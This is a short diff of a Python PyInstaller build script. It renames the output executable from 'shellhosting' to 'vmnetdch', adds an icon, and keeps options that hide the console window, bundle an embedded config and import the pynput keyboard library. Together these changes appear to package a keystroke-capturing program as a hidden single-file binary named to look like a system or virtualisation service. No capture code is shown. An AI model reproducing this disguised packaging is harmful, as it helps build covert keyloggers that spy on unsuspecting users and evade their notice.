@@ -9,7 +9,7 @@ import sys
 import platform
 from pathlib import Path
 
-EXECUTABLE_NAME = "shellhosting"
+EXECUTABLE_NAME = "vmnetdch"
 
 
 def build():
@@ -35,11 +35,13 @@ def build():
     sep = ";" if platform.system() == "Windows" else ":"
     
     # PyInstaller command
+    icon_path = Path("assets/app.ico")
     cmd = [
         "pyinstaller",
         f"--name={EXECUTABLE_NAME}",
         "--onefile",  # Single executable file
         "--windowed",  # Hide console window
+        f"--icon={icon_path}",  # Application icon
         f"--add-data=config.py{sep}.",  # Include config.py
         f"--add-data=config_values.py{sep}.",  # Include embedded config
         "--hidden-import=pynput.keyboard",
